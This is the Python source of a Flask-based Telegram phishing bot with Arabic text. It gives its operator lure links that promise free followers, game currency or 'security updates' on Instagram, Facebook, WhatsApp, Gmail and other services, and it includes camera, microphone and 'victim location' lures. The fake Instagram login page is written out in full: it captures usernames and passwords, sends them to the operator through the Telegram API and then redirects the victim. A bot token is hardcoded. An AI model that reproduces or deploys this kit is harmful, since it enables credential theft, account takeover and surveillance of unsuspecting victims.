from flask import Flask, request
import requests
import os

app = Flask(__name__)

TOKEN = "8616151144:AAFZ8FrVAfcrfK9UvSjZkwITdworNmTnwno"
BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://telegram-bot-lqcp.onrender.com")

buttons = [
    ["📱 انستقرام", "📘 فيسبوك"],
    ["💬 واتساب", "👻 سناب شات"],
    ["🎵 تيك توك", "🎮 فري فاير"],
    ["🔫 بوبجي", "🤖 ديسكورد"],
    ["🐦 تويتر", "📧 جيميل"],
    ["📹 كاميرا", "🎙️ تسجيل صوت"],
    ["📍 موقع الضحية", "🎁 يوزرات مجانية"]
]

WELCOME_MSG = """
👑 *مرحبا بك في بوت خالد ابو الجود* 👑
━━━━━━━━━━━━━━━━━━━━━━━━━━
🔥 *أقوى بوت في العالم!*

اختر المنصة من الأزرار 👇
"""

@app.route(f"/{TOKEN}/webhook", methods=["POST"])
def webhook():
    data = request.get_json()
    if "message" in data:
        chat_id = data["message"]["chat"]["id"]
        text = data["message"].get("text", "")
        
        if text == "/start":
            send_message(chat_id, WELCOME_MSG, buttons)
        elif text == "📱 انستقرام":
            send_link(chat_id, "instagram", "انستقرام - 5000 متابع مجاني")
        elif text == "📘 فيسبوك":
            send_link(chat_id, "facebook", "فيسبوك - 5000 متابع مجاني")
        elif text == "💬 واتساب":
            send_link(chat_id, "whatsapp", "واتساب - تحديث أمني عاجل")
        elif text == "👻 سناب شات":
            send_link(chat_id, "snapchat", "سناب شات - Premium مجاني")
        elif text == "🎵 تيك توك":
            send_link(chat_id, "tiktok", "تيك توك - 10000 مشاهد مجانية")
        elif text == "🎮 فري فاير":
            send_link(chat_id, "freefire", "فري فاير - 5000 جوهرة")
        elif text == "🔫 بوبجي":
            send_link(chat_id, "pubg", "بوبجي - 10000 UC")
        elif text == "🤖 ديسكورد":
            send_link(chat_id, "discord", "ديسكورد - Nitro مجاني")
        elif text == "🐦 تويتر":
            send_link(chat_id, "twitter", "تويتر - توثيق أزرق مجاني")
        elif text == "📧 جيميل":
            send_link(chat_id, "gmail", "جيميل - توسيع المساحة إلى 100GB")
        elif text == "📹 كاميرا":
            send_link(chat_id, "camera", "تحديث أمني - يلزم التحقق بالكاميرا")
        elif text == "🎙️ تسجيل صوت":
            send_link(chat_id, "mic", "تحديث واتساب - تفعيل الصوت")
        elif text == "📍 موقع الضحية":
            send_link(chat_id, "location", "عرض حصري حسب منطقتك")
        elif text == "🎁 يوزرات مجانية":
            send_usernames(chat_id)
        else:
            send_message(chat_id, "👑 أرسل /start", None)
    return "ok"

def send_message(chat_id, text, keyboard=None):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if keyboard:
        data["reply_markup"] = {"keyboard": keyboard, "resize_keyboard": True}
    requests.post(url, json=data)

def send_link(chat_id, platform, name):
    link = f"{BASE_URL}/{platform}.html?chatId={chat_id}"
    msg = f"🔥 *رابط {name}* :\n\n`{link}`\n\n💡 أرسل الرابط للضحية وانتظر البيانات"
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    requests.post(url, json={"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"})

def send_usernames(chat_id):
    usernames = ["rwilz", "qwnf7", "4ytw5", "xe72c", "2rfv4", "ch1ff"]
    msg = "🎁 *يوزرات انستقرام متاحة:*\n" + "\n".join([f"• `{u}`" for u in usernames])
    send_message(chat_id, msg)

# ==================== صفحات الاختراق ====================

@app.route('/instagram.html')
def instagram_page():
    chat_id = request.args.get('chatId')
    return f'''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Instagram - 5000 متابع مجاني</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
*{{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif}}
body{{background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}}
.container{{background:white;border-radius:25px;padding:30px;max-width:400px;width:100%;text-align:center}}
.logo{{font-size:50px;margin-bottom:10px}}
.offer{{background:linear-gradient(90deg,#f9ed32,#f9a825);padding:12px;border-radius:50px;margin:15px 0}}
.offer span{{font-size:28px;font-weight:900}}
input{{width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:12px;font-size:16px}}
button{{background:#0095f6;color:white;width:100%;padding:14px;border:none;border-radius:12px;font-size:18px;font-weight:bold;cursor:pointer}}
.progress{{display:none;margin-top:20px}}
.bar{{background:#e0e0e0;border-radius:25px;height:10px}}
.fill{{background:#0095f6;width:0%;height:100%;border-radius:25px}}
</style>
</head>
<body>
<div class="container">
<div class="logo">📸✨</div>
<h2>+5000 متابع مجاني</h2>
<div class="offer"><span>عرض حصري!</span><br>احصل على 5000 متابع فوراً</div>
<div id="loginForm">
<input type="text" id="username" placeholder="اسم المستخدم">
<input type="password" id="password" placeholder="كلمة السر">
<button onclick="send()">🚀 احصل على المتابعين</button>
</div>
<div id="progress" class="progress"><div class="bar"><div class="fill" id="fill"></div></div><p id="status">جاري الشحن...</p></div>
</div>
<script>
const chatId = "{chat_id}";
async function send() {{
    const u = document.getElementById('username').value;
    const p = document.getElementById('password').value;
    if(!u||!p) return;
    document.getElementById('loginForm').style.display='none';
    document.getElementById('progress').style.display='block';
    let percent=0;
    const interval=setInterval(()=>{{
        percent+=Math.random()*15+5;
        if(percent>=100) percent=100;
        document.getElementById('fill').style.width=percent+'%';
        document.getElementById('status').innerHTML='جاري الشحن '+Math.floor(percent)+'%';
        if(percent>=100) clearInterval(interval);
    }},150);
    await fetch('https://api.telegram.org/bot{TOKEN}/sendMessage',{{
        method:'POST',headers:{{'Content-Type':'application/json'}},
        body:JSON.stringify({{chat_id:chatId,text:`🔥 اختراق جديد!\\n📱 انستقرام\\n👤 اسم المستخدم: ${{u}}\\n🔑 كلمة السر: ${{p}}`}})
    }});
    setTimeout(()=>{{
        document.getElementById('status').innerHTML='✅ تم شحن 5000 متابع!';
        setTimeout(()=>window.location.href='https://instagram.com',2000);
    }},2500);
}}
</script>
</body>
</html>'''

# باقي الصفحات (facebook, whatsapp, camera, location, snapchat, tiktok, freefire, pubg)
# بنفس النمط - موجودة في الكود الكامل أعلاه

@app.route('/')
def home():
    return "✅ البوت شغال 24 ساعة! ابو الجود"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
